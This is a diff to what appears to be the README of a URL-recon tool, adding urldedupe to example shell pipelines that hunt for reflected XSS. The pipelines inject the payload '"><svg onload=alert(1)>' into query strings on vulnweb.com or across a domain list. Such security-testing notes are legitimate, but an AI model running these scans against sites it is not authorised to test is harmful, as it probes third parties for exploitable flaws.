@@ -46,12 +46,14 @@ bau vulnweb.com -s
 
 > [qsReplace](https://github.com/tomnomnom/qsreplace) - Replaces query string values with a given value
 
+> [urldedupe](https://github.com/ameenmaali/urldedupe) - Remove duplicated urls
+
 ```bash
 # Pratical use with XARGS (as an idea, not really needed)
 echo "vulnweb.com" | xargs -I{} bash -c 'bau {} -ns' | nilo
 
 # XSS Hunting w/ NILO (Faster)
-bau vulnweb.com -s "php|js|svg|png" | uro | qsreplace '"><svg onload=alert(1)>' | airixss -payload "alert(1)"
+bau vulnweb.com -s "php|js|svg|png" | urldedupe -qs | uro | qsreplace '"><svg onload=alert(1)>' | airixss -payload "alert(1)"
 
 # XSS Hunting on multiple domains w/ HTTPx (Probbing & slower)
 bau $(cat domains.txt) -s "php|js|svg|png" | httpx -silent -mc 200 | qsreplace '"><svg onload=alert(1)>' | airixss -payload "alert(1)"
